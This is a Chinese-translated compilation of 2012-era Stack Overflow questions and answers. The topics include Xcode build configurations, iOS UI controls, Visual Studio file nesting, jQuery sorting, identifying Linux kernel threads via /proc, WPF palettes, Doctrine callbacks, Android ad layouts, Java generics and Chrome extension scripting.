**注意：**我在 Xcode 4.2 上归档 AdHoc 构建没有问题...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T06:25:02.570

好的，我想通了。

我有四种构建配置：

1.  调试（Xcode 的“预装”）
2.  发布（Xcode 的“预装”）
3.  AdHoc（发布的克隆，使用 Ad Hoc 配置文件）
4.  AppStore（发布的克隆，使用 App Store Provisioning Profile）

（我假设每个人都这样做，但为了清楚起见）

我发现它是损坏的“AppStore”构建配置：我编辑了我的“发布”方案（通常运行“发布”构建并存档“AppStore”构建）以将“AppStore”配置用于“**运行”**选项卡，并且我收到了与归档时相同的警告。

因此，我删除了“AppStore”配置并通过再次克隆“Release”配置重新创建它，（重新）将其设置为使用 App Store 分发配置文件，现在项目存档以供发布，没有任何问题。

这种混乱很可能是典型的“Xcode 项目在机器之间传输和/或使用不同版本重新打开时损坏”的情况。

# objective-c - 如何修复 UITextField 中文本的大小，使其不与标签重叠？

> ID：12213435
> 
> 赞同：0
> 
> 时间：2012-08-31T10:23:53.847
> 
> 标签：objective-c, ios5, uitextfield, uilabel

我有一个`UITextField`和一个`UILabel`。标签右对齐，文本左对齐，问题是当我在文本字段中输入文本时，只要文本大小变大，它就会与标签重叠。如何防止标签重叠？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:38:49.227

更新：-您可以使用 value1 或 value2 类型的表格视图单元格，它为您提供这种格式，并使用 TextLabel 作为主标题，并将文本字段放置在 detailtext 的位置。这可以修复。

# objective-c - 如何使 UIToolbar 中的 UIActivityIndi catorView 可点击

> ID：12213436
> 
> 赞同：0
> 
> 时间：2012-08-31T10:23:57.213
> 
> 标签：objective-c, uitoolbar, uiactivityindicatorview

我正在使用此代码将 UIActivityIndi​​catorView 插入到我的工具栏

```
-(void)addActivityIndicatorToToolbar {
    UIActivityIndicatorView *activityIndicator = [[UIActivityIndicatorView alloc] initWithFrame:CGRectMake(0, 0, 20, 20)];
    activityIndicator.userInteractionEnabled = YES;
    activityIndicator.activityIndicatorViewStyle = UIActivityIndicatorViewStyleWhite;
    [activityIndicator startAnimating];

    UIBarButtonItem *barButton = [[UIBarButtonItem alloc] initWithCustomView:activityIndicator];
    barButton.target = self;
    barButton.action = @selector(playButtonPressed:);

    NSMutableArray *toolbarItemsMutable = [self.toolbar.items mutableCopy];
    [toolbarItemsMutable replaceObjectAtIndex:0 withObject:barButton];
    self.toolbar.items = toolbarItemsMutable;  
} 
```

但是，当我点击 UIActivityIndi​​catorView 时，不会执行操作 (playButtonPressed)。

我该如何纠正？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:20:05.760

您似乎更有可能想要一个带有活动指示器的按钮。您可以通过创建一个带有自定义视图的按钮来完成此操作，如[本文](https://stackoverflow.com/questions/1719533/add-uiactivityindicatorview-into-uibarbutton)所述。然后您可以正常设置此按钮的操作，并且您可能希望保留对活动指示器的引用以启动和停止它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-04-05T19:49:48.033

这是一个很老的问题，但你为什么不直接`UITapGestureRecognizer`向你的实例添加一个`UIActivityIndicatorView`实例呢？（在 iOS 8.2 上运行良好，我还没有在以前的版本上测试过）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-18T16:08:46.633

我最终通过在activityIndi​​catorView 顶部添加一个带有gestureRecognizer 的额外视图来实现一个穷人的解决方案。

# c# - 在解决方案资源管理器中创建子项

> ID：12213439
> 
> 赞同：9
> 
> 时间：2012-08-31T10:24:20.770
> 
> 标签：c#, visual-studio

我们在 C# 中使用分配部分类来对大型类的代码进行分类。在解决方案资源管理器中，我们将列出如下代码文件：

```
- MyClass.cs
- MyClass.Partial1.cs
- MyClass.Partial2.cs 
```

但是我们想要的是这样的（正如您在设计器文件等中看到的那样）：

```
- MyClass.cs
    ˪ MyClass.Partial1.cs
    ˪ MyClass.Partial2.cs 
```

我知道您可以手动修改项目文件以设置此依赖项，如下所示：

```
<Compile Include="MyClass.cs" />
<Compile Include="MyClass.Partial1.cs">
    <DependentUpon>MyClass.cs</DependentUpon>
</Compile>
<Compile Include="MyClass.Partial2.cs">
    <DependentUpon>MyClass.cs</DependentUpon>
</Compile> 
```

视觉工作室有捷径吗？或者也许可以帮助解决这个问题的扩展？（无需手动编辑项目文件）

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-31T10:30:10.670

[这个](https://stackoverflow.com/questions/3621345/how-to-group-partial-class-files-in-solution-explorer-vs2010)和[这个](https://stackoverflow.com/questions/3617539/group-files-in-visual-studio)问题的重复。

他们的回答：`Group Items`在[VSCommands for Visual Studio 2010中可用](http://visualstudiogallery.msdn.microsoft.com/d491911d-97f3-4cf6-87b0-6a2882120acf/)

还有一个插件可以做到**这**一点：[NestIn](http://visualstudiogallery.msdn.microsoft.com/9d6ef0ce-2bef-4a82-9a84-7718caa5bb45)

**更新**
还有第二个插件可以做几乎相同的事情：[文件嵌套](https://visualstudiogallery.msdn.microsoft.com/3ebde8fb-26d8-4374-a0eb-1e4e2665070c)

# javascript - 使用 javascript 或 jquery 按 id 在 ascen/desc div 中排序

> ID：12213442
> 
> 赞同：0
> 
> 时间：2012-08-31T10:24:33.943
> 
> 标签：javascript, jquery, sorting, html

“我想按升序/降序对 div 进行排序，其中 div id 是动态的

```
 "<div id="main">
  <div class="fr" id="FlightResult_2_142897_Y_AI_Air-India"></div>
  <div class="fr" id="FlightResult_1_122893_Y_AA_American-Airlines"></div>
  <div class="fr" id="FlightResult_2_162891_Y_S2_Air-Sahara"></div>
  <div class="fr" id="FlightResult_1_152894_Y_9W_jJet-Airways"></div>
  <div class="fr" id="FlightResult_2_172895_Y_AI_Air-India"></div>
  <div class="fr" id="FlightResult_1_192898_Y_RA_Nepal-Airlines"></div>
</div>" 
```

div 应按给定参数排序，例如可以是“Y”或“Air-India”，这些值在 div id 中给出，下划线分隔，如上面 div id="FlightResult_2_142897_Y_AI_Air-India"

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:42:35.640

//首先将 div id 加载到一个数组中，然后按照你想要的顺序对数组进行排序，例如

```
var div_array = ["FlightResult_2_142897_Y_AI_Air-   India","FlightResult_1_122893_Y_AA_American-Airlines","FlightResult_2_162891_Y_S2_Air-Sahara","FlightResult_1_152894_Y_9W_jJet-Airways"]; 
```

//然后对数组进行排序

```
div_array.sort(); 
```

//然后添加到主div

```
for(var i=o; i< div_array.length ; i++)
{
   $("#main").append($("<div class='fr' id='"+ div_array[i] +"'> </div>"));
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:37:05.560

我认为最简单的解决方案是使用 jQuery 库和排序插件。排序插件可以在这里找到：http: [//james.padolsey.com/javascript/sorting-elements-with-jquery/](http://james.padolsey.com/javascript/sorting-elements-with-jquery/)

您可以问我以下代码是否有问题或您不理解某些部分的问题。

```
<html>
    <head>
        <script type="text/javascript" src="./js/jquery-1.7.1.min.js"></script>
        <script type="text/javascript" src="./js/jqplugin/sort.js"></script>

        <script>
        $(function() {
            $("button").click(function() {
                // Get the option "opt" which is in the attribute "rel" of the button clicked:
                // 1 - Sort by trip type
                // 2 - Sort by price
                // 3 - Sort by refundable status
                // 4 - Sort by airline code
                // 5 - Sort by airline full name
                var opt = parseInt($(this).attr("rel"));

                var my_button = $(this);

                $('#main .fr').sort(function(a, b) {
                    // The inputs "a" and "b" are 2 div lines of class "fr". 
                    // We will compare these for sorting

                    // Get the information of "a" and "b", stored in their ID attribute
                    var infoA = $(a).attr("id").split("_");
                    var infoB = $(b).attr("id").split("_");
                    var nameA = null;
                    var nameB = null;

                    nameA = infoA[opt];
                    nameB = infoB[opt];

                    var output = null;

                    if($(my_button).hasClass("desc"))
                        return nameB.toUpperCase() > nameA.toUpperCase() ? 1 : -1;
                    else
                        return nameA.toUpperCase() > nameB.toUpperCase() ? 1 : -1;
                });

                if($(this).hasClass("desc"))
                    $(my_button).removeClass("desc")
                else
                    $(this).addClass("desc")
            });
        });
        </script>
    </head>

    <body>
        <div id="main">
          <div class="fr" id="FlightResult_2_142897_Y_AI_Air-India">1 - FlightResult_2_142897_Y_AI_Air-India</div>
          <div class="fr" id="FlightResult_1_122893_Y_AA_American-Airlines">2 - FlightResult_1_122893_Y_AA_American-Airlines</div>
          <div class="fr" id="FlightResult_2_162891_N_S2_Air-Sahara">3 - FlightResult_2_162891_N_S2_Air-Sahara</div>
          <div class="fr" id="FlightResult_1_152894_Y_9W_jJet-Airways">4 - FlightResult_1_152894_Y_9W_jJet-Airways</div>
          <div class="fr" id="FlightResult_2_172895_N_AI_Air-India">5 - FlightResult_2_172895_N_AI_Air-India</div>
          <div class="fr" id="FlightResult_1_192898_Y_RA_Nepal-Airlines">6 - FlightResult_1_192898_Y_RA_Nepal-Airlines</div>
            </div>
            <button id="sort_trip_type" rel="1">Sort By Trip Type</button>
            <button id="sort_price" rel="2">Sort By Price</button>
            <button id="sort_refund_status" rel="3">Sort By Refundable Status</button>
            <button id="sort_air_code" rel="4">Sort By Airlines Code</button>
        <button id="sort_air_name" rel="5">Sort By Airlines Full Name</button>
    </body>
</html> 
```

# linux - 识别内核线程

> ID：12213445
> 
> 赞同：16
> 
> 时间：2012-08-31T10:24:46.400
> 
> 标签：linux, process

我想知道如何区分我正在构建的进程扫描器的内核线程和用户线程。我很难找到这两种类型的良好定义。

我发现内核线程没有自己的内存，因此 /proc/$pid/status 中没有 Vm* 值，并且 /proc/$pid/exe 上的统计信息不返回任何内容。

因此，我认为如果进程没有 Vm* 值且没有 inode 编号，我可以识别内核线程。我想错了......我的脚本有时会看到被识别为内核进程的 php-cgi 进程。

如果发现这些错误识别的进程中的大多数都是僵尸，一秒钟后就消失了。所以我实施了一个简单的检查来查看状态是否为“Z”。如果是这样，请忽略它。这为我节省了很多误报，但我仍然收到有关 php-cgi 内核进程的消息。

谁能告诉我如何以正确的方式区分内核线程和用户线程？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-01T20:13:20.207

内核线程和用户空间线程之间有*一些*明显的区别：

*   `/proc/$pid/cmdline`对于内核线程为空 - 这是用于区分内核线程`ps`的方法。`top`

*   符号链接没有内核线程的`/proc/$pid/exe`目标——这是有道理的，因为它们在文件系统上没有相应的可执行文件。

    更具体地说，[`readlink()`](http://linux.die.net/man/2/readlink)系统调用返回`ENOENT`（*“没有这样的文件或目录”*），尽管链接本身存在，以表示该进程的可执行文件不存在（并且从未存在）的事实。

    因此，检查内核线程的可靠方法应该是调用`readlink()`并`/proc/$pid/exe`检查其返回码。如果成功，`$pid`则为用户进程。如果它以 失败`ENOENT`，那么额外的`stat()`on`/proc/$pid/exe`应该可以将内核线程的情况与刚刚终止的进程区分开来。

*   `/proc/$pid/status`缺少*大多数*内核线程的几个字段 - 更具体地说是一些与虚拟内存相关的字段。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-21T04:21:12.770

正如您在上面自己的评论中指出的那样，所有用户进程都是 init 进程（pid=1）的后代。内核线程不是 init 进程的后代，因为 init 是一个用户进程，用户进程不能创建内核线程。因此，要检查进程 p 是否是用户进程而不是内核线程，需要对进程图进行操作并评估`init dom p`dom 是否是[Dominator](http://en.wikipedia.org/wiki/Dominator_%28graph_theory%29)运算符。具体在 Python 中：

```
def is_user_process(p):
  if (p=='1'):
    print 'User process'
  else:
    pstat = open('/proc/%s/stat'%p).read().split()
    parent = pstat[3]
    if (parent=='1'):
      print 'User process'
    elif (parent=='0'):
      print 'Kernel thread'
    else:
      is_user_process(parent) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2019-05-29T23:09:59.000

您可以从（[参见 proc(5) 手册页](http://man7.org/linux/man-pages/man5/proc.5.html)）读取线程`flags`值并检查它是否设置了位标志。`/proc/[pid]/stat``PF_KTHREAD`

`PF_KTHREAD`constant 本身[从 2.6.17 开始可用](https://github.com/torvalds/linux/commit/7b34e4283c685f5cc6ba6d30e939906eee0d4bcf)，大约 10 年了，[从那时起它的值没有改变](https://elixir.bootlin.com/linux/v5.2-rc2/ident/PF_KTHREAD)：

```
#define PF_KTHREAD      0x00200000  /* I am a kernel thread */ 
```

即使包含[这个](http://man7.org/linux/man-pages/man2/uname.2.html)常量`include/linux/sched.h`（.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-06-10T21:57:51.870

这是在 bash 下工作的版本：

```
# check if pid is user process and not a kernel thread
is_user_process() {
  if [[ $1 -eq 1 ]]; then
    return 0
  else
    parent=$(grep -e '^PPid:' /proc/$1/status | cut -c6-)
    if [[ $parent -eq 1 ]]; then
      return 0
    elif [[ $parent -eq 0 ]]; then
      return 1
    else
      is_user_process $parent
    fi
  fi
} 
```

使用它做

```
~$ is_user_process `pgrep kthreadd` || echo "kthreadd is kernel process" 
```

这至少对我来说是第一个有用的解决方案，感谢 python 版本的 er0。

# c# - 从 256 种颜色为 WritableBitmap 创建自定义调色板

> ID：12213452
> 
> 赞同：1
> 
> 时间：2012-08-31T10:25:07.463
> 
> 标签：c#, wpf, bitmap, palette

我现在一直在寻找将近一个小时，但找不到答案。我目前正在开发一个程序，该程序以灰度或具有 256 种预定颜色的色阶显示自定义图像（使用 WritableBitmap）。

图像的输入将是一个字节数组（如果我将 PixelFormat 属性设置为 PixelFormats.Gray8，则可以正常工作），但由于我也需要自定义颜色比例，我想创建自定义比例（一个用于灰色，一个用于或更多颜色）。我认为我需要使用的是 PixelFormat.Indexed8 属性，但我根本不知道如何使用它以及如何创建自定义调色板，并且互联网对如何创建一个没有帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T10:45:59.427

您可以创建自定义[`BitmapPalette`](http://msdn.microsoft.com/en-us/library/system.windows.media.imaging.bitmappalette.aspx)并将其应用于新的[`WriteableBitmap`](http://msdn.microsoft.com/en-us/library/system.windows.media.imaging.writeablebitmap.aspx)：

```
var myPalette = new BitmapPalette(new List<Color> 
{ 
    Colors.Red,
    Colors.Blue,
    Colors.Green,
    // ...
});

var writeableBitmap = new WriteableBitmap(
    width, 
    height, 
    96, 
    96, 
    PixelFormats.Indexed8, // Paletted bitmap with 256 colours
    myPalette);

writeableBitmap.WritePixels(...); 
```

# symfony - 每次更改属性时更新“更新”属性

> ID：12213453
> 
> 赞同：1
> 
> 时间：2012-08-31T10:25:17.647
> 
> 标签：symfony, doctrine-orm

我的学说实体有一个`datetime`名为`updated`. 每次将对象的（更改的）值写入数据库时​​，这应该获取当前时间。我知道如何在 MySql 中做到这一点，但我正在寻找一个学说/symfony 解决方案。

有没有办法

1.  在将实例的 INSERT/UPDATE 发送到数据库之前挂钩。
2.  将属性更新为`updated`当前时间，并确保将其写入数据库而不触发第二条 UPDATE 语句。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T10:32:07.780

请参阅[DoctrineExtensions](https://github.com/l3pp4rd/DoctrineExtensions)的[时间戳行为](https://github.com/l3pp4rd/DoctrineExtensions/blob/master/doc/timestampable.md)。有[StofDoctrineExtensionsBundle](https://github.com/stof/StofDoctrineExtensionsBundle)可以将其集成到 Symfony 中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-02T10:54:10.057

您不需要任何扩展，只需使用[Lifecycle Callbacks](http://doctrine-orm.readthedocs.org/en/latest/reference/events.html#lifecycle-callbacks)即可。基本上，将您的实体标记为具有使用`HasLifecycleCallbacks`注释配置的事件回调：

```
use Doctrine\ORM\Mapping as ORM;

/**
 * @ORM\Entity
 * @ORM\HasLifecycleCallbacks
 * ...
 */
class MyEntityClass {
... 
```

然后标记要在发生的特定事件上运行的实例方法，例如设置`updated`：

```
...
class MyEntityClass {
...
    /**
     * @ORM\PreUpdate
     */
    public function onPreUpdate() {
        $this->updated = new \DateTime();
    }
... 
```

# c# - 调用 Magento 服务返回错误“无法识别的消息版本”。

> ID：12213454
> 
> 赞同：1
> 
> 时间：2012-08-31T10:25:18.910
> 
> 标签：c#, wcf, web-services, magento

我正在尝试使用 WCF 调用 Magento Web 服务。但我不断收到以下错误消息。Web 服务可以毫无困难地在 chrome 中查看。

应用程序配置

```
 <system.serviceModel>
        <bindings>
            <basicHttpBinding>
                <binding name="Mage_Api_Model_Server_V2_HandlerBinding" maxReceivedMessageSize="999999" />

            </basicHttpBinding>
        </bindings>
        <client>
            <endpoint address="http://xxx.co.uk/api/v2_soap?wsdl=1/"
                binding="basicHttpBinding" bindingConfiguration="Mage_Api_Model_Server_V2_HandlerBinding"
                contract="PoqService.Mage_Api_Model_Server_V2_HandlerPortType"
                name="Mage_Api_Model_Server_V2_HandlerPort" />
        </client>
    </system.serviceModel>

System.ServiceModel.CommunicationException was unhandled
  HResult=-2146233087
  Message=Unrecognized message version.
  Source=mscorlib
  StackTrace:
    Server stack trace: 
       at System.ServiceModel.Channels.ReceivedMessage.ReadStartEnvelope(XmlDictionaryReader reader)
       at System.ServiceModel.Channels.BufferedMessage..ctor(IBufferedMessageData messageData, RecycledMessageState recycledMessageState, Boolean[] understoodHeaders, Boolean understoodHeadersModified)
       at System.ServiceModel.Channels.BufferedMessage..ctor(IBufferedMessageData messageData, RecycledMessageState recycledMessageState)
       at System.ServiceModel.Channels.TextMessageEncoderFactory.TextMessageEncoder.ReadMessage(ArraySegment`1 buffer, BufferManager bufferManager, String contentType)
       at System.ServiceModel.Channels.MessageEncoder.ReadMessage(Stream stream, BufferManager bufferManager, Int32 maxBufferSize, String contentType)
       at System.ServiceModel.Channels.HttpInput.ReadChunkedBufferedMessage(Stream inputStream)
       at System.ServiceModel.Channels.HttpInput.ParseIncomingMessage(HttpRequestMessage httpRequestMessage, Exception& requestException)
       at System.ServiceModel.Channels.HttpChannelFactory`1.HttpRequestChannel.HttpChannelRequest.WaitForReply(TimeSpan timeout)
       at System.ServiceModel.Channels.RequestChannel.Request(Message message, TimeSpan timeout)
       at System.ServiceModel.Channels.ServiceChannel.Call(String action, Boolean oneway, ProxyOperationRuntime operation, Object[] ins, Object[] outs, TimeSpan timeout)
       at System.ServiceModel.Channels.ServiceChannelProxy.InvokeService(IMethodCallMessage methodCall, ProxyOperationRuntime operation)
       at System.ServiceModel.Channels.ServiceChannelProxy.Invoke(IMessage message)
    Exception rethrown at [0]: 
       at System.Runtime.Remoting.Proxies.RealProxy.HandleReturnMessage(IMessage reqMsg, IMessage retMsg)
       at System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke(MessageData& msgData, Int32 type)
       at pedlars.testing.PoqService.Mage_Api_Model_Server_V2_HandlerPortType.login(String username, String apiKey)
       at pedlars.testing.PoqService.Mage_Api_Model_Server_V2_HandlerPortTypeClient.login(String username, String apiKey) in c:\Users\j\Documents\Visual Studio 2012\Projects\pedlars.testing\pedlars.testing\Service References\PoqService\Reference.cs:line 28802
       at pedlars.testing.Program.Main(String[] args) in c:\Users\j\Documents\Visual Studio 2012\Projects\pedlars.testing\pedlars.testing\Program.cs:line 18
       at System.AppDomain._nExecuteAssembly(RuntimeAssembly assembly, String[] args)
       at Microsoft.VisualStudio.HostingProcess.HostProc.RunUsersAssembly()
       at System.Threading.ExecutionContext.RunInternal(ExecutionContext executionContext, ContextCallback callback, Object state, Boolean preserveSyncCtx)
       at System.Threading.ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state, Boolean preserveSyncCtx)
       at System.Threading.ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state)
       at System.Threading.ThreadHelper.ThreadStart()
  InnerException: 
```

# java - 使用 Eclipse 在 web tomcat 中部署 web 项目

> ID：12213457
> 
> 赞同：1
> 
> 时间：2012-08-31T10:25:25.763
> 
> 标签：java, eclipse, web-services, tomcat, eclipse-plugin

> **可能重复：**
> [从 Eclipse 远程部署 Tomcat webapp](https://stackoverflow.com/questions/1760297/remote-deploy-tomcat-webapp-from-eclipse)

我想知道是否可以将 web 服务从 eclipse 直接部署到它的主机位于另一台计算机上的 tomcat 服务器上？如果有可能怎么办？

此致

# yii - 是否可以在面包屑中添加工具提示？

> ID：12213463
> 
> 赞同：0
> 
> 时间：2012-08-31T10:25:34.640
> 
> 标签：yii

> 我想为面包屑实现一些工具提示有没有办法做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-11T11:33:39.117

通过简单的 jQuery 命令获得解决方案，将其添加到面包屑数组的 itemoptions 中。

```
'rel'=>'tooltip','title'=>'click here to read the mail')), $this->menu=array(

array('label'=>'Inbox', 'url'=>array('MessageTo/inbox'),'itemOptions'=>array('class'=>'inbox', 'rel'=>'tooltip','title'=>'click here to read the mail')),

);
?> 
```

# android - 广告隐藏视图中的额外空间

> ID：12213464
> 
> 赞同：-1
> 
> 时间：2012-08-31T10:25:35.697
> 
> 标签：android, admob

我正在制作一个应用程序，我想在布局中显示广告。当我这样做时，当广告可见时一切正常，但当广告不可见时，它仍然占据布局/视图中的空间。请告诉我如何解决这个问题。

这是布局文件：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:ads="http://schemas.android.com/apk/lib/com.google.ads"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:layout_centerHorizontal="true"
    android:orientation="vertical" >

    <RelativeLayout
        android:id="@+id/frameLayout"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent" >

        <ScrollView
            android:id="@+id/scrollView"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:layout_marginBottom="90.0dip"
            android:layout_marginLeft="1.0dip"
            android:layout_marginRight="1.0dip"
            android:layout_marginTop="-2.0dip"
            android:animateLayoutChanges="true"
            android:fadeScrollbars="true"
            android:fadingEdge="none" >

            <RelativeLayout
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:visibility="visible" >

                <ImageView
                    android:id="@+id/QuestionImageView"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:visibility="visible" />

                <TextView
                    android:id="@+id/tv"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_below="@id/QuestionImageView"
                    android:fadingEdge="vertical"
                    android:scrollbars="vertical" />

                <TextView
                    android:id="@+id/questionnumber"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_alignParentRight="true"
                    android:fadingEdge="vertical"
                    android:scrollbars="vertical" />

                <TextView
                    android:id="@+id/question"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:layout_alignParentRight="true"
                    android:layout_below="@id/tv"
                    android:fadingEdge="vertical"
                    android:padding="10dp"
                    android:scrollbars="vertical"
                    android:text=""
                    android:textColor="@color/dark_green" />

                <RadioGroup
                    android:id="@+id/radioGroup1"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:layout_below="@id/question"
                    android:orientation="vertical" >

                    <RadioButton
                        android:id="@+id/option1"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="" />

                    <ImageView
                        android:layout_width="fill_parent"
                        android:layout_height="1.0dp"
                        android:background="@drawable/thinnest_blue_gradient" />

                    <RadioButton
                        android:id="@+id/option2"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="" />

                    <ImageView
                        android:layout_width="fill_parent"
                        android:layout_height="1.0dp"
                        android:background="@drawable/thinnest_blue_gradient" />

                    <RadioButton
                        android:id="@+id/option3"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="" />

                    <ImageView
                        android:layout_width="fill_parent"
                        android:layout_height="1.0dp"
                        android:background="@drawable/thinnest_blue_gradient" />

                    <RadioButton
                        android:id="@+id/option4"
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="" />
                </RadioGroup>
            </RelativeLayout>
        </ScrollView>
    </RelativeLayout>

    <RelativeLayout
        android:id="@+id/relativequestion"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true" >

        <com.google.ads.AdView
            android:id="@+id/ad"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:layout_alignParentBottom="true"
            ads:adSize="SMART_BANNER"
            ads:adUnitId="a1501e5633125fb"
            ads:loadAdOnCreate="true"
            ads:testDevices="TEST_EMULATOR, 123456789ABCDEF" />

        <LinearLayout
            android:id="@+id/newquestion"
            android:layout_width="fill_parent"
            android:layout_height="40.0dip"
            android:layout_above="@id/ad"
            android:background="#ff777777"
            android:orientation="horizontal" >

            <Button
                android:id="@+id/PrevButton"
                android:layout_width="fill_parent"
                android:layout_height="fill_parent"
                android:layout_centerInParent="true"
                android:layout_marginLeft="5.0dip"
                android:layout_weight="1.0"
                android:background="@drawable/ibtn"
                android:onClick="onPrevButtonClick"
                android:text="Prev" />

            <Button
                android:id="@+id/NextButton"
                android:layout_width="fill_parent"
                android:layout_height="fill_parent"
                android:layout_centerInParent="true"
                android:layout_marginLeft="5.0dip"
                android:layout_weight="1.0"
                android:background="@drawable/ibtn"
                android:onClick="onNextButtonClick"
                android:text="Next" />

            <Button
                android:id="@+id/SkipButton"
                android:layout_width="fill_parent"
                android:layout_height="fill_parent"
                android:layout_centerInParent="true"
                android:layout_marginLeft="5.0dip"
                android:layout_weight="1.0"
                android:background="@drawable/ibtn"
                android:onClick="onSkipButtonClick"
                android:text="Skip" >
            </Button>

            <Button
                android:id="@+id/SubmitButton"
                android:layout_width="fill_parent"
                android:layout_height="fill_parent"
                android:layout_centerInParent="true"
                android:layout_marginLeft="5.0dip"
                android:layout_marginRight="5.0dp"
                android:layout_weight="1.0"
                android:background="@drawable/ibtn"
                android:onClick="onSubmitButtonClick"
                android:text="Submit" />
        </LinearLayout>
    </RelativeLayout>  
</RelativeLayout> 
```

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:43:03.277

尝试

```
ad.setVisibility(View.GONE) 
```

它应该使广告块消失

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:43:06.827

这可能是`View.Invisible`vs的问题`View.Gone`吗？

[http://developer.android.com/reference/android/view/View.html#INVISIBLE](http://developer.android.com/reference/android/view/View.html#INVISIBLE)

[http://developer.android.com/reference/android/view/View.html#GONE](http://developer.android.com/reference/android/view/View.html#GONE)

# php - 带有 PHP 和流体网格布局的 HTML5

> ID：12213471
> 
> 赞同：0
> 
> 时间：2012-08-31T10:26:17.207
> 
> 标签：php, html, grid, dreamweaver

我最近得到了dreamweaver cs6，因为它是流体网格布局的最新升级。我很高兴了解 HTML5，但还没有。然而，我注意到 html5 中不能有 php 编码。有没有办法启用它？我经常使用 php，只是想知道。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:29:25.553

PHP 在服务器上运行。HTML 是一种由浏览器（客户端）解析的标记语言。您没有为 HTMl5 “启用” PHP，而是在服务器上运行它，它会吐出任何你想要的东西。如果这恰好是 HTML5，那么如果浏览器支持它，您将获得一个页面。

您可以像使用 HTML 4.01 一样编写 PHP；只有客户会看到不同。对于服务器来说，它“都是字符串”。

# java - 静态方法中的泛型

> ID：12213472
> 
> 赞同：1
> 
> 时间：2012-08-31T10:26:36.563
> 
> 标签：java, generics, static-methods

我需要在实用程序类中添加一个方法，其中包含一些静态方法，这些方法从 JSON 字符串中解析事物并返回一个事物数组。

问题是这些东西有各种子类型，所以我创建了这个方法：

```
public static <E extends Thing> E[] parseThingsFromJSON(String body) {
    return parser.fromJson(body, E[].class);
} 
```

调用者如何告诉这个方法是什么`E`？还是有更好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-31T10:28:49.063

你需要通过它。

```
public static <E extends Thing> E[] parseThingsFromJSON(String body, Class<E[]> eClass) {
    return parser.fromJson(body, eClass);
} 
```

泛型在很大程度上是一个编译时特性。这意味着它在运行时不可用（有一些例外）

在这种情况下，要使泛型类型在运行时可用，您必须将其作为附加参数传递。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:29:19.203

从内存来看，这与使用 Arrays.asList() 时遇到的问题类似

有了这个你做

```
Arrays.<MyOjbect>(new MyObject(), new MyObject()); 
```

或者在您传递数组的特定情况下，例如

```
Arrays.<Integer[]>asList(new Integer[]{new Integer(1)}); 
```

此方法在 JDK 中的签名是

```
public static <T> List<T> asList(T... a){...} 
```

我认为这与您的相似

# ajax - 注入我的脚本时如何等到嵌入的ajax调用完成？

> ID：12213473
> 
> 赞同：-1
> 
> 时间：2012-08-31T10:26:42.267
> 
> 标签：ajax, jquery, google-chrome-extension

这是谷歌浏览器扩展开发。我正在使用内容脚本注入网页。然而，有些网页有自己的 ajax 脚本，可以动态更改内容。我如何等到这些脚本完成，因为在它们完成之前我的脚本无法获得正确的内容？

例如，

1-在谷歌搜索结果页面上，

2-我想将“文本”附加到每个搜索结果项的标题，这可以通过调用轻松完成，

```
$('h3').append("text"); 
```

3-然后听搜索查询的变化，由

```
$('input[name="q"]').change( function(eventObj){
    console.log("query changed");
    // DOESN'T work
    $('h3').append("text");
}); 
```

最后一行不起作用*可能是*因为在它执行时页面仍在刷新并且`$('h3')`不可用。当页面上的查询更改时，Google 使用 ajax 刷新搜索结果。

所以问题是如何捕捉这种变化，并且每次都能成功地附加“文本” *？*

**编辑：**

尝试过但也没有工作：

```
$('h3[class="r"]').delay(1000).append("text"); 
```

并且使用`.delay()`并不是真正的首选。

**编辑：**

`.delay()`根本不是为了解决UI 效果以外的脚本执行*暂停问题。*一种解决方法是

```
$('input[name="q"]').change(function(eventObj) {    
    setTimeout(function() {
      $('h3[class="r"]').append(" text");
    }, 1000);
}); 
```

但正如我之前所说，`setTimeout()`连接速度取决于连接速度，而不是首选，因为我必须手动平衡等待时间和响应速度（我的脚本）。

虽然这篇文章被拒绝投票给上帝知道为什么我仍然会等待一个优雅的答案。

